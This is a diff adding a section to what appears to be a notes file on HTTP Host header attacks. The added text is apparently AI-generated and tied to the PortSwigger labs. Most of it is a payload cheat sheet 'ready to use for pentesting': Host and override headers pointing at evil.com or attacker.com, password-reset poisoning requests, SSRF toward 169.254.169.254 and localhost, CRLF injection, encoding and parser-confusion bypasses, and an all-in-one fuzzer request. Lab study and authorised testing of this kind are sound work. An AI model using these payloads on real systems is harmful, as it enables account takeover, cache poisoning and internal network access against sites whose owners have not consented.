@@ -675,6 +675,312 @@ Here’s a cheat sheet of payloads that may help bypass WAFs during Host Header 
 
 Sure! Based on the content from the GitHub repository you linked, here are the **specific techniques demonstrated in the PortSwigger Labs for HTTP Host header attacks**:
 
+# **1. List of Vulnerabilities (Full Set)**
+
+1. **Web Cache Poisoning**
+2. **Password Reset Link Poisoning**
+3. **Host Header Injection**
+4. **Open Redirect / URL Confusion**
+5. **Virtual Host Routing Bypass**
+6. **SSRF via Host Header**
+7. **Access Control Bypass**
+8. **CORS Bypass Using Host Reflection**
+9. **Log Injection**
+10. **Firewall / WAF Bypass Cases** *(NEW)*
+11. **Domain Validation Bypass** *(NEW)*
+12. **Header Override Bypass** *(NEW)*
+13. **Unicode / Encoding Bypass** *(NEW)*
+
+---
+
+# **2. Sample Payloads (Including Bypass Payloads)**
+
+All payloads are ready to use for pentesting.
+
+---
+
+# 📌 **2.1 Basic Manipulation Payloads**
+
+```
+Host: evil.com
+```
+
+```
+Host: attacker.com
+```
+
+```
+Host: fake.target.com
+```
+
+---
+
+# 📌 **2.2 Password Reset Poisoning**
+
+```
+POST /forgot HTTP/1.1
+Host: evil.com
+Content-Type: application/json
+
+{"email":"victim@example.com"}
+```
+
+---
+
+# 📌 **2.3 Open Redirect / URL Confusion**
+
+```
+Host: evil.com:8080
+```
+
+```
+Host: legit.com.evil.com
+```
+
+---
+
+# 📌 **2.4 SSRF Using Host Header**
+
+```
+Host: 127.0.0.1
+```
+
+```
+Host: 169.254.169.254   # AWS metadata
+```
+
+```
+Host: localhost
+```
+
+---
+
+# 📌 **2.5 Admin Panel / VHost Bypass**
+
+```
+Host: admin.target.com
+```
+
+```
+Host: internal.target.local
+```
+
+```
+Host: staging.target.com
+```
+
+---
+
+# **3. Bypass Testcases (Advanced)**
+
+Below are full bypass patterns to defeat filters, WAF, and strict host validation logic.
+
+---
+
+# 🔥 **3.1 Domain Validation Bypass Payloads**
+
+### Case: Application checks `endswith("target.com")` incorrectly
+
+```
+Host: target.com.evil.io
+```
+
+```
+Host: target.com.attacker.net
+```
+
+```
+Host: evil.com?target.com
+```
+
+```
+Host: target.com#evil.com
+```
+
+---
+
+# 🔥 **3.2 Header Override Bypass**
+
+Some applications prioritize these headers over `Host:`:
+
+```
+X-Forwarded-Host: evil.com
+```
+
+```
+X-Host: attacker.com
+```
+
+```
+X-Forwarded-Server: evil.com
+```
+
+```
+X-HTTP-Host-Override: evil.com
+```
+
+Combine:
+
+```
+Host: trusted.com
+X-Forwarded-Host: evil.com
+```
+
+---
+
+# 🔥 **3.3 Port-Based Bypass**
+
+```
+Host: target.com:443
+```
+
+```
+Host: target.com:80
+```
+
+```
+Host: target.com:8080
+```
+
+```
+Host: target.com:*
+```
+
+These bypass strict host comparisons.
+
+---
+
+# 🔥 **3.4 Whitespace / Tab Injection Bypass**
+
+```
+Host: evil.com%20
+```
+
+```
+Host: evil.com%0d%0aInjected: yes
+```
+
+```
+Host: evil.com\t
+```
+
+```
+Host: evil.com\r\nX-Test: 123
+```
+
+---
+
+# 🔥 **3.5 Unicode / Encoding Bypass Cases**
+
+### Using punycode:
+
+```
+Host: xn--evil-9sa.com
+```
+
+### Using IP-long form:
+
+```
+Host: 2130706433     # 127.0.0.1 in decimal
+```
+
+### Hex:
+
+```
+Host: 0x7f000001
+```
+
+### Octal:
+
+```
+Host: 0177.0000.0001
+```
+
+### Mixed Encoding:
+
+```
+Host: evil.com%2Etarget.com
+```
+
+---
+
+# 🔥 **3.6 Prefix / Suffix Injection Bypass**
+
+### Fake trusted-host prefix:
+
+```
+Host: trusted.com.evil.com
+```
+
+### Using @ to confuse parsers:
+
+```
+Host: trusted.com@evil.com
+```
+
+### Using double host headers:
+
+```
+Host: evil.com
+Host: target.com
+```
+
+Some servers will parse the last one; some the first.
+
+---
+
+# 🔥 **3.7 Null Byte / Special Character Bypass**
+
+```
+Host: evil.com%00target.com
+```
+
+```
+Host: target.com%00.evil.com
+```
+
+```
+Host: target.com\evil.com
+```
+
+---
+
+# 🔥 **3.8 CORS Bypass Using Host Reflection**
+
+Check if server reflects Host header into CORS:
+
+```
+Host: evil.com
+Origin: http://evil.com
+```
+
+---
+
+# 🔥 **3.9 CDN / Proxy Bypass (Akamai, Cloudflare, Nginx)**
+
+```
+Forwarded: host=evil.com
+```
+
+```
+X-Forwarded-Host: internal-admin
+```
+
+---
+
+# ✔ **4. Combined Master Payload (All-in-One Fuzzer)**
+
+This helps catch most host header issues in one go:
+
+```
+GET / HTTP/1.1
+Host: evil.com
+X-Forwarded-Host: evil.com
+X-Host: attacker.com
+X-Forwarded-Server: admin.local
+Origin: http://evil.com
+Forwarded: host=internal.target
+```
 ### 🧪 Techniques Covered in the Labs
 
 - **Password Reset Poisoning via Host Header**
